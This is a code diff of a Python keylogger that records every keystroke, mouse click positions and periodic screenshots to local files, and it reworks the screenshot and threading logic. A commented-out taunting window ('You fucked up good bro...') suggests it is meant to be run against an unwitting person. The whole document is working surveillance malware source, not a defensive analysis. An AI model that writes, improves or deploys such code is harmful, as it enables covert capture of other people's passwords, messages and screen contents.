@@ -4,7 +4,7 @@ from datetime import datetime
 from string import ascii_lowercase
 from random import choices
 from pynput import mouse
-from PIL import ImageGrab
+from pyautogui import screenshot
 #C:\Users\alessandro.030108\AppData\Local\Programs\Python\Python311
 
 
@@ -55,11 +55,7 @@ class get_keyboard_input:
         write_file(f"{datetime.now()} - Started logging", log_name)
 
         keyboard.on_release(callback=self.format_input)
-        keyboard.wait()    
-
-def write_file(input, filename):
-    with open(f'{filename}.txt', 'a') as f:
-        f.write(input+"\n")
+        keyboard.wait()
 
 def get_mouse_input(x, y, button, pressed):
     global pressed_location
@@ -71,25 +67,28 @@ def get_mouse_input(x, y, button, pressed):
         write_file(f"{datetime.now()} - Mouse pressed at X:{pressed_location[0]} Y:{pressed_location[1]} and released at X:{released_location[0]} Y:{released_location[1]}", log_name)
 
 def get_printscreen():
-    while True:
-        starttime = time.time()
-        shot = ImageGrab.grab()
-        try:
-            shot.save(f"{datetime.now()}.jpg")
-        except:
-            pass
-        
-        time.sleep(60.0 - ((time.time() - starttime) % 60.0))
-        
+    starttime = time.time()
+    screen_log = screenshot()
+    screen_log.save(f"./{datetime.now().date()}.png")
 
+def write_file(input, filename):
+    with open(f'{filename}.txt', 'a') as f:
+        f.write(input+"\n")
 
 if __name__ == "__main__":
     #create_window("You fucked up good bro...", "500x200", "\n              ..----.._    _\n            .' .--.    '-.(O)_\n'-.__.-'''=:|  ,  _)_ \__ . c\'-..\n             ''------'---''---'-'\n")
 
+    get_printscreen()
+
     click_logger = mouse.Listener(on_click=get_mouse_input)
-    click_logger.start()
+    clicklogger_thread = Thread(target=click_logger.start())
     keylogger = get_keyboard_input()
-    screen_logger = get_printscreen()
-    Thread(target=keylogger.start()).start()
-    Thread(target=screen_logger()).start()
+    keylogger_thread = Thread(target=keylogger.start())
+
+    clicklogger_thread.start()
+    keylogger_thread.start()
+    clicklogger_thread.join()
+    keylogger_thread.join()
+    
+
 
